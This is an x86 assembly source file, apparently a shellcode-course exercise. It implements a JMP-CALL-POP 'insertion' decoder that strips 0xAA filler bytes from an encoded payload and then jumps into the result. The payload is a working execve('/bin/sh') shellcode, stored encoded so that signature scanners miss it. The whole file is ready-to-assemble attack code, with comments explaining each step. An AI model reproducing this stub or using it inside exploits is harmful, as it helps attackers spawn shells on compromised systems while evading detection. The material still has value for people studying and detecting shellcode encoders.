; Date: 07/03/2019
; Insertion-Decoder.asm
; Author: Daniele Votta
; Description: This program decode shellcode with insertion technique.
; JMP | CALL | POP | Techniques

global _start

section .text

_start:

	jmp short call_decoder

decoder:
	pop esi				; Get address of encoded shellcode
	lea edi,[esi+1]			; Counter tracks along shellcode length
	xor eax,eax			; Counter
	mov al,1	
	xor ebx,ebx

decode:
	mov bl,byte [esi+eax]		; esi+eax point to first 0xAA
	xor bl,0xaa			; Endup result in 0
	jnz short EncodedShellcode

	mov bl, byte [esi+eax+1]	; Next available space to insert
	mov byte [edi],bl		; Copy to location pointed by edi
	inc edi
	add al,2
	jmp short decode

call_decoder:
	call decoder

	; Execve /bin/sh (50 bytes) | 0xAA - 0xBB Terminator
	EncodedShellcode: db 0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x68,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x89,0xaa,0xe3,0xaa,0x50,0xaa,0x89,0xaa,0xe2,0xaa,0x53,0xaa,0x89,0xaa,0xe1,0xaa,0xb0,0xaa,0x0b,0xaa,0xcd,0xaa,0x80,0xaa, 0xbb, 0xbb
